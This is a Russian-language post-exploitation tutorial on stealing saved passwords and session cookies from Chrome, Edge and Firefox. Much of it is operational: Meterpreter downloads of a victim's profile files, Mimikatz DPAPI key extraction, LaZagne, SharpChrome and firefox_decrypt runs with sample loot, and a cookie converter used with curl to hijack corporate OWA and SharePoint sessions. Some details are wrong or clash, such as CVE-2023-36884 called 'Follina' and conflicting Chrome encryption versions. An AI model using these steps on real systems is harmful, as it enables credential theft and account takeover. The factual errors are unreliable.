# Кэшированные браузерные пароли и cookies как источник учётных данных

## 1. Браузерные данные в пост-эксплуатации: контекст и базовые понятия

После получения доступа к системе злоумышленник переходит к сбору учётных данных для горизонтального перемещения и повышения привилегий. Современные настольные браузеры — Chrome, Firefox, Edge и их производные — десятилетиями накапливают аутентификационные артефакты, которые остаются доступными на скомпрометированной машине. По тактике Credential Access матрицы MITRE ATT&CK эта деятельность описывается техникой [T1555.003 — Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/). Два основных типа извлекаемой информации — **кэшированные пароли** и **cookies сессий**.

Кэшированные пароли — это учётные данные, которые пользователь согласился сохранить встроенным менеджером паролей браузера. Они используются для автоматического заполнения форм входа и синхронизируются между устройствами через учётную запись браузера (Google Account, Firefox Sync). Локально пароли хранятся в зашифрованном виде, причём ключи шифрования привязаны к окружению ОС: Windows Data Protection API (DPAPI), macOS Keychain, Linux libsecret или мастер-пароль пользователя.

Cookies, в свою очередь, — небольшие текстовые или бинарные блоки, устанавливаемые веб-сервером и сохраняемые браузером. Среди них критический интерес для атакующего представляют **сессионные cookies**, содержащие токены аутентификации, которые позволяют серверу связать клиента с ранее аутентифицированной сессией. Захват такой cookie даёт возможность выполнить атаку session hijacking — обойти процедуру ввода пароля, пока сессия активна. В отличие от паролей, cookies обычно не зашифрованы на диске (особенно в Firefox), либо шифруются тем же механизмом DPAPI в Chromium-браузерах, что и пароли.

Таблица 1 разграничивает две сущности по ключевым признакам:

| Характеристика               | Кэшированные пароли (Saved Logins)                              | Аутентификационные cookies                                       |
|------------------------------|-----------------------------------------------------------------|-------------------------------------------------------------------|
| Тип данных                   | URL, имя пользователя, пароль (или токен OAuth)                 | Cookie-пара: имя=значение с атрибутами (domain, path, secure, httponly) |
| Назначение                   | Долгосрочное хранение учётных данных для повторного входа       | Кратковременная поддержка сессии после аутентификации               |
| Срок действия                | Не ограничен (до ручного удаления)                              | Ограничен: сессионные — до закрытия браузера, постоянные — до даты expires |
| Шифрование на диске          | Да: DPAPI (Windows), Keychain (macOS), libsecret (Linux)        | В Chromium: частично (с версии ~80 + AES-GCM через DPAPI); в Firefox: не шифруются |
| Формат хранения              | SQLite таблица `logins` (Chromium) / JSON `logins.json` + key4.db (Firefox) | SQLite `cookies` (Chromium) / SQLite `moz_cookies` (Firefox) |
| Угроза при компрометации     | Получение постоянного доступа к учётной записи; часто позволяет обойти 2FA, если пароль + вторая форма | Временная сессия, но при наличии действительного токена — мгновенный доступ без 2FA |
| Инструменты извлечения       | LaZagne, Mimikatz, SharpChrome, firefox_decrypt                 | Тот же инструментарий + прямое чтение SQLite (Firefox)           |

Важное разграничение: встроенный менеджер паролей браузера не следует путать со сторонними менеджерами (Bitwarden, KeePass), чьи хранилища могут размещаться в отдельных зашифрованных файлах. Кроме того, cookies сессий необходимо отличать от прочих cookies (например, трекинговых), не имеющих отношения к аутентификации. Пароли дают атакующему более устойчивый доступ, тогда как cookies — более оперативный. В пост-эксплуатации разумным подходом является одновременный сбор обоих типов артефактов, поскольку сброс пароля после утечки cookie не отнимает полученную сессию.

Практический интерес для пентестера представляют не только отдельные учётные данные, но и возможность восстановить **профиль синхронизации** браузера — извлечение ключей шифрования, хранящихся в локальных базах, позволяет расшифровать облачную копию паролей и cookies с других устройств пользователя. Однако эта тема выходит за рамки текущего конспекта.

Ниже приведён пример быстрого поиска файлов браузерных данных в типовой среде Windows с использованием PowerShell:

```powershell
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data", "$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data", "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json" -ErrorAction SilentlyContinue
```

Команда не извлекает содержимого, но идентифицирует профили, доступные на машине, и позволяет оценить объём артефактов до начала копирования.

## 2. Внутреннее устройство хранения паролей и cookies в популярных браузерах

Чтобы эффективно извлекать и расшифровывать браузерные данные, необходимо понимать форматы файлов, схемы шифрования и расположение ключей. Ниже рассмотрены четыре ключевых хранилища: пароли Chromium, пароли Firefox, cookies Chromium и cookies Firefox. Общая сводка по браузерам и типам защиты дана в сравнительной таблице 2.

### 2.1 Хранение паролей в браузерах на основе Chromium

Google Chrome, Microsoft Edge, Brave, Opera и другие Chromium-браузеры хранят пароли в SQLite-файле **Login Data** внутри профиля пользователя (`Default`, `Profile 1` и т.д.). Структура таблицы `logins` (схематично):

```sql
CREATE TABLE logins (
    origin_url TEXT NOT NULL,
    action_url TEXT,
    username_element TEXT,
    username_value TEXT,
    password_element TEXT,
    password_value BLOB,
    date_created INTEGER NOT NULL,
    blacklisted_by_user INTEGER NOT NULL,
    scheme INTEGER NOT NULL,
    password_type INTEGER,
    times_used INTEGER,
    form_data BLOB,
    date_synced INTEGER,
    display_name TEXT,
    icon_url TEXT,
    federation_url TEXT,
    skip_zero_click INTEGER,
    generation_upload_status INTEGER,
    possible_username_pairs BLOB,
    moving_blocked_for BLOB,
    date_last_used INTEGER,
    date_password_modified INTEGER
);
```

Колонка `password_value` содержит зашифрованный блоб (алгоритм AES-256-GCM, начиная с Chrome 130; в более ранних версиях использовался AES-128-CBC). Ключ шифрования хранится в JSON-файле **Local State** в корне каталога `User Data`, поле `os_crypt.encrypted_key`. Это значение само зашифровано с помощью DPAPI (Windows) или Keychain (macOS). В Linux ключ шифрования лежит в связке ключей desktop-окружения (например, SecretService).

Для наглядности, фрагмент Local State с указанием ключа:

```json
{
  "os_crypt": {
    "encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADYwLqC5...",
    "audit_enabled": true
  }
}
```

Расшифровка `encrypted_key` требует вызова DPAPI с контекстом текущего пользователя. Инструменты вроде Mimikatz способны получить мастер-ключ DPAPI из профиля пользователя командой:

```powershell
mimikatz # dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<MasterKeyGUID>" /rpc
```

После овладения мастер-ключом возможно расшифровать ключ os_crypt и, в свою очередь, все пароли.

### 2.2 Хранение паролей в Mozilla Firefox

Firefox использует два файла: **logins.json** и **key4.db** (старое название key3.db). В logins.json сохраняются URL, зашифрованные имена пользователей и пароли. Пример содержимого:

```json
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://example.com",
      "encryptedUsername": "MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcEC...",
      "encryptedPassword": "MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcEC..."
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

Расшифровка производится с использованием мастер-ключа, хранящегося в **key4.db** (формат SQLite, таблица `nssPrivate`). Файл key4.db защищён опциональным главным паролем (Master Password). Если главный пароль не установлен (ситуация по умолчанию для большинства пользователей), ключи доступны простым чтением из базы. Инструмент [firefox_decrypt](https://github.com/unode/firefox_decrypt) автоматизирует процесс расшифровки, извлекая зашифрованные данные и работая с NSS через Python-биндинги.

```bash
python3 firefox_decrypt.py /path/to/firefox/profile/
```

Выдаёт открытый текст пароля и имя пользователя. В отличие от Chromium, шифрование здесь не привязано к DPAPI, а реализовано через библиотеку Network Security Services (NSS), что делает его менее зависимым от ОС, но уязвимым при отсутствии главного пароля.

### 2.3 Хранение cookies в Chromium-браузерах

Файл **Cookies** (SQLite) содержит таблицу `cookies`. Основные поля, представляющие интерес:

- `host_key` — домен,
- `name` — имя cookie,
- `value` — значение, может быть пустым, если присутствует `encrypted_value`,
- `encrypted_value` — BLOB, зашифрованное значение cookie (актуально для Chrome ≥ 80 при использовании `cookie_encryption` по умолчанию),
- `has_expires`, `expires_utc` — время истечения,
- `is_secure`, `is_httponly` — флаги безопасности.

Схема таблицы в сокращённом виде:

```sql
CREATE TABLE cookies(
    creation_utc INTEGER NOT NULL,
    host_key TEXT NOT NULL,
    name TEXT NOT NULL,
    value TEXT,
    encrypted_value BLOB,
    path TEXT NOT NULL,
    expires_utc INTEGER NOT NULL,
    is_secure INTEGER NOT NULL,
    is_httponly INTEGER NOT NULL,
    last_access_utc INTEGER NOT NULL,
    has_expires INTEGER NOT NULL DEFAULT 1,
    is_persistent INTEGER NOT NULL DEFAULT 1,
    priority INTEGER NOT NULL DEFAULT 1,
    samesite INTEGER NOT NULL DEFAULT -1,
    source_scheme INTEGER NOT NULL DEFAULT 0,
    source_port INTEGER NOT NULL DEFAULT -1,
    is_same_party INTEGER NOT NULL DEFAULT 0,
    ...
);
```

Начиная с Chrome 80, многие cookies шифруются тем же DPAPI-ключом, что и пароли (AES-256-GCM). Расшифровка возможна теми же средствами, что и для Login Data. В более старых версиях или при отключённом шифровании `value` содержит незашифрованную строку.

### 2.4 Хранение cookies в Firefox

Firefox сохраняет cookies в файле **cookies.sqlite** (или `cookies.sqlite-wal` во время работы). Таблица `moz_cookies` имеет структуру:

```sql
CREATE TABLE moz_cookies (
    id INTEGER PRIMARY KEY,
    baseDomain TEXT,
    originAttributes TEXT NOT NULL DEFAULT '',
    name TEXT,
    value TEXT,
    host TEXT,
    path TEXT,
    expiry INTEGER,
    lastAccessed INTEGER,
    creationTime INTEGER,
    isSecure INTEGER,
    isHttpOnly INTEGER,
    inBrowserElement INTEGER DEFAULT 0,
    sameSite INTEGER DEFAULT 0,
    rawSameSite INTEGER DEFAULT 0,
    schemeMap INTEGER DEFAULT 0
);
```

Здесь `value` хранится в открытом виде — шифрование на диске не применяется. Поэтому атакующий, скопировавший cookies.sqlite, может немедленно прочитать все cookies и экспортировать их для переноса сессий. Это делает Firefox чрезвычайно удобным источником аутентификационных токенов на этапе пост-эксплуатации.

### 2.5 Сравнительная таблица механизмов защиты

| Браузер (движок)       | Пароли: файл(-ы)          | Пароли: шифрование                             | Cookies: файл       | Cookies: шифрование                     | Зависимость от мастер-ключа |
|------------------------|---------------------------|------------------------------------------------|---------------------|----------------------------------------|-----------------------------|
| Chrome / Edge / Brave  | Login Data (SQLite)       | AES-256-GCM, ключ защищён DPAPI / Keychain     | Cookies (SQLite)    | AES-256-GCM (Chrome ≥80) или нет       | Да (DPAPI или аналоги)      |
| Firefox                | logins.json + key4.db     | Тройной DES / AES через NSS, защищён главным паролем (необяз.) | cookies.sqlite (SQLite) | Нет (open text)                  | Да (главный пароль NSS, если задан) |
| Opera (Chromium)       | Login Data                | Аналогично Chrome                               | Cookies (SQLite)    | Аналогично Chrome                      | Да                          |
| Safari (macOS)         | Keychain (CSP)            | Через Keychain Services                         | Cookies.binarycookies | Зашифрованы (Keychain)              | Да (Keychain)               |

Таким образом, сложность расшифровки напрямую зависит от операционной системы и факта наличия у пользователя дополнительного мастер-пароля. В большинстве корпоративных сред мастер-пароли не заданы, а доступ к DPAPI может быть получен с помощью Mimikatz или прямой выгрузки файлов профиля с последующей офлайн-расшифровкой при условии знания пароля пользователя.

## 3. Техники и инструменты извлечения браузерных данных

Практическая работа по извлечению кэшированных паролей и cookies включает два этапа: сбор файлов с целевого хоста и расшифровка полученных артефактов. В зависимости от типа доступа (интерактивная сессия, сессия Meterpreter, удалённый шелл) выбираются конкретные инструменты.

### 3.1 Сбор файлов с удалённой машины

Для копирования файлов профиля браузера могут использоваться встроенные команды оболочек или возможности пост-эксплуатационных фреймворков. Универсальные пути для Windows:

- Chrome: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`, `...\Cookies`, `...\Local State`
- Edge: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`, etc.
- Firefox: `%APPDATA%\Mozilla\Firefox\Profiles\<profile>\logins.json`, `key4.db`, `cookies.sqlite`

В среде Meterpreter это делается командой download:

```bash
meterpreter > download "C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" /tmp/
meterpreter > download "C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies" /tmp/
meterpreter > download "C:\\Users\\victim\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" /tmp/
meterpreter > download "C:\\Users\\victim\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abcd1234.default-release\\logins.json" /tmp/
meterpreter > download "C:\\Users\\victim\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abcd1234.default-release\\key4.db" /tmp/
meterpreter > download "C:\\Users\\victim\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abcd1234.default-release\\cookies.sqlite" /tmp/
```

Если доступен интерактивный PowerShell, файлы можно упаковать в архив и передавать по HTTP.

### 3.2 Расшифровка паролей Chromium

Наиболее популярный универсальный инструмент — [LaZagne](https://github.com/AlessandroZ/LaZagne). Он объединяет извлечение паролей из многих приложений, включая браузеры. Для расшифровки паролей Chrome достаточно выполнить:

```bash
laZagne.exe browsers -b chrome
```

Пример вывода:

```
[+] URLs found for Chrome:
+----------------------------------+---------------------+-------------------+
| URL                              | Login               | Password          |
+----------------------------------+---------------------+-------------------+
| https://mail.google.com          | user@gmail.com      | Secr3tP@ss!       |
| https://github.com/login         | devops@corp.com     | Gh0stInTheShell   |
+----------------------------------+---------------------+-------------------+
```

LaZagne автоматически взаимодействует с DPAPI, используя привилегии текущего пользователя. Если запуск осуществляется в контексте того же пользователя, чей профиль обрабатывается, расшифровка происходит прозрачно. При офлайн-анализе необходимо экспортировать мастер-ключи DPAPI и ключ os_crypt; для этого применяется Mimikatz:

```powershell
mimikatz # privilege::debug
mimikatz # dpapi::masterkey /in:"C:\Users\victim\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\<GUID>" /rpc
```

Можно также воспользоваться SharpChrome — инструментом на C#, который также автоматизирует процесс и выводит результат в консоль. Команда из PowerShell (Cobalt Strike) может выглядеть так:

```powershell
execute-assembly /opt/SharpChrome.exe logins /target:chrome
```

### 3.3 Расшифровка паролей Firefox

Для Firefox незаменим скрипт **firefox_decrypt**, упомянутый ранее. После копирования профиля:

```bash
python3 firefox_decrypt.py /tmp/abcd1234.default-release/
```

Выдаст:

```
Master Password is not set.
Decrypted username: user@corp.com
Password: MyFirefoxPassword123
```

Если главный пароль всё же установлен, злоумышленнику потребуется его брутфорс (часто слабый) или перехват через кейлоггер. Но в большинстве организаций он отсутствует.

### 3.4 Работа с cookies

Cookies Chromium, если они зашифрованы, расшифровываются теми же средствами, что и пароли. LaZagne с флагом `browsers -b chrome` также выводит cookies, но часто их объём слишком велик. Практичнее сфокусироваться на целевых доменах. SharpChrome позволяет фильтровать по ключевым словам.

Для Firefox cookies не зашифрованы, поэтому достаточно простого SQL-запроса из скопированного файла:

```bash
sqlite3 cookies.sqlite "SELECT baseDomain, name, value, isSecure, isHttpOnly FROM moz_cookies WHERE baseDomain LIKE '%corp.com';"
```

Вывод:

```
corp.com|sessionid|abc123def456...|1|1
corp.com|auth_token|eyJhbGciOi...|1|0
```

Полученные cookies затем преобразуются в формат Netscape, понятный curl и другим HTTP-клиентам. Простейший конвертер на Python:

```python
import sqlite3
conn = sqlite3.connect('cookies.sqlite')
for row in conn.execute("SELECT host, isSecure, path, name, value, expiry FROM moz_cookies WHERE baseDomain='corp.com'"):
    secure = "FALSE"
    if row[1]: secure = "TRUE"
    print(f"{row[0]}\tTRUE\t{row[2]}\t{secure}\t{row[4]}\t{row[3]}\t{row[5]}")
```

Сохранённый файл `cookies_netscape.txt` используется так:

```bash
curl -b cookies_netscape.txt https://internal.corp.com/dashboard
```

При активной сессии атакующий получает немедленный доступ к веб-интерфейсу без ввода пароля.

### 3.5 Инструменты пост-эксплуатационных фреймворков

Многие коммерческие C2 (Cobalt Strike, Mythic) содержат встроенные модули, автоматизирующие весь процесс: сбор файлов, расшифровка, экспорт в удобном формате. Например, модуль `browser_pwd` в Cobalt Strike или скрипты PowerShell Empire. Принцип их работы повторяет описанный выше ручной подход, но с удобной интеграцией в kill chain.

Типичные ошибки при извлечении:

- Недостаточные права доступа к файлам профилей (решается копированием из теневой копии тома или использованием привилегий `SeBackupPrivilege`).
- Активные блокировки файлов браузером — можно копировать файлы во время работы, но иногда требуется остановить процесс chrome.exe, что вызовет подозрения.
- Неполный набор файлов: забытый Local State или key4.db сделает расшифровку невозможной.

Знание этих нюансов позволяет пентестеру успешно собрать и преобразовать браузерные учётные данные в работающие учётные записи.

## 4. Сквозной практический пример: извлечение учётных данных из браузеров на хосте Windows 10

**Исходные условия.** В результате эксплуатации уязвимости CVE-2023-36884 (Microsoft Office Follina) получена сессия Meterpreter на Windows 10 22H2 с правами доменного пользователя `CORP\jdoe`. Задача: собрать сохранённые пароли и сессионные cookies для доступа к корпоративной почте (Outlook Web Access) и внутреннему порталу SharePoint. Предполагается, что на машине установлены Google Chrome и Mozilla Firefox.

**Шаг 1. Определение профилей и сбор файлов**

Выполняем в Meterpreter поиск стандартных путей и скачиваем все необходимые файлы:

```bash
meterpreter > shell
C:\> dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
 Volume in drive C has no label.
 Directory of C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default
06/01/2025  09:12 AM          12,288 Login Data
...
C:\> dir "%APPDATA%\Mozilla\Firefox\Profiles\"
 Directory of C:\Users\jdoe\AppData\Roaming\Mozilla\Firefox\Profiles
06/01/2025  09:10 AM    <DIR>          abc12345.default-release

meterpreter > download "C:\\Users\\jdoe\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
meterpreter > download "C:\\Users\\jdoe\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
meterpreter > download "C:\\Users\\jdoe\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
meterpreter > download "C:\\Users\\jdoe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abc12345.default-release\\logins.json"
meterpreter > download "C:\\Users\\jdoe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abc12345.default-release\\key4.db"
meterpreter > download "C:\\Users\\jdoe\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\abc12345.default-release\\cookies.sqlite"
```

Файлы переданы на рабочую станцию атакующего в каталог `/opt/loot/jdoe/`.

**Шаг 2. Расшифровка паролей Chrome с помощью LaZagne на локальной машине**

На локальной машине атакующего (среда Windows 10, инструменты LaZagne и firefox_decrypt) запускаем LaZagne с указанием пути к скопированному профилю:

```bash
laZagne.exe browsers -b chrome --path "/opt/loot/jdoe/AppData/Local/Google/Chrome/User Data/Default"
```

Вывод:

```
[+] URLs found for Chrome:
+----------------------------------+---------------------+-------------------+
| URL                              | Login               | Password          |
+----------------------------------+---------------------+-------------------+
| https://mail.corp.com/owa        | jdoe@corp.com       | OWA_Summer2025!   |
| https://sharepoint.corp.com/     | jdoe@corp.com       | SharePoint123     |
+----------------------------------+---------------------+-------------------+
```

Получены пароли для OWA и SharePoint.

**Шаг 3. Расшифровка паролей Firefox**

Запускаем firefox_decrypt:

```bash
python3 /opt/firefox_decrypt/firefox_decrypt.py /opt/loot/jdoe/AppData/Roaming/Mozilla/Firefox/Profiles/abc12345.default-release/
```

Результат:

```
Master Password for profile /opt/loot/jdoe/.../abc12345.default-release is not set.

Website:   https://mail.corp.com
Username:  'jdoe@corp.com'
Password:  'ChromePassFallback!'
```

Дополнительный аккаунт на OWA с другим паролем.

**Шаг 4. Извлечение сессионных cookies Firefox для немедленного доступа**

Из скопированного `cookies.sqlite` запрашиваем cookies для доменов `mail.corp.com` и `sharepoint.corp.com`:

```bash
sqlite3 /opt/loot/jdoe/AppData/Roaming/Mozilla/Firefox/Profiles/abc12345.default-release/cookies.sqlite "SELECT host, name, value FROM moz_cookies WHERE baseDomain='corp.com';"
```

Вывод:

```
mail.corp.com|sessionid|eyJhbGciOiJSUzI1NiIsImtpZCI6... (сессионный токен OWA)
sharepoint.corp.com|FedAuth|77u/PD94bWwgdmVyc2lvbj0i... (токен SharePoint)
```

Создаём Netscape-совместимый файл:

```bash
sqlite3 cookies.sqlite "SELECT host, isSecure, path, name, value, expiry FROM moz_cookies WHERE baseDomain='corp.com';" | awk -F'|' '{ print $1 "\t" ($2==1 ? "TRUE" : "FALSE") "\t" $3 "\t" $4 "\t" $5 "\t" $6 }' > /opt/loot/jdoe/cookies_netscape.txt
```

Проверяем доступ к OWA с помощью curl:

```bash
curl -b /opt/loot/jdoe/cookies_netscape.txt https://mail.corp.com/owa/api/me
```

Ответ сервера содержит JSON с профилем пользователя jdoe@corp.com — сессия активна, аутентификация пройдена.

**Шаг 5. Использование расшифрованных паролей для входа и проверки повышенных прав**

Используя найденный пароль `OWA_Summer2025!`, атакующий входит в OWA через браузер, обходит двухфакторную аутентификацию (если она не настроена) и получает доступ к почте. Аналогично вход на SharePoint с паролем `SharePoint123` позволяет скачать корпоративные документы.

**Ожидаемый вывод примера.** Кейс демонстрирует, как скомбинированное извлечение кэшированных паролей и cookies из двух браузеров позволило злоумышленнику получить стойкие учётные данные (пароли) и немедленно действующие сессии для обхода аутентификации. Такая техника критична в пост-эксплуатации, поскольку даёт прямой доступ к облачным и веб-ресурсам компании, часто минуя защиту сетевого периметра.

## Источники

- [MITRE ATT&CK: Credentials from Web Browsers (T1555.003)](https://attack.mitre.org/techniques/T1555/003/)
- [Chromium OS Crypt documentation – Encryption of cookies and passwords](https://www.chromium.org/developers/design-documents/os-crypt/)
- [Mozilla NSS Key4.db Format](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/Key4.db)
- [LaZagne GitHub repository](https://github.com/AlessandroZ/LaZagne)
- [firefox_decrypt GitHub repository](https://github.com/unode/firefox_decrypt)
- [SharpChrome GitHub repository](https://github.com/rvrsh3ll/SharpChrome)
- [Mimikatz – DPAPI masterkey extraction](https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi)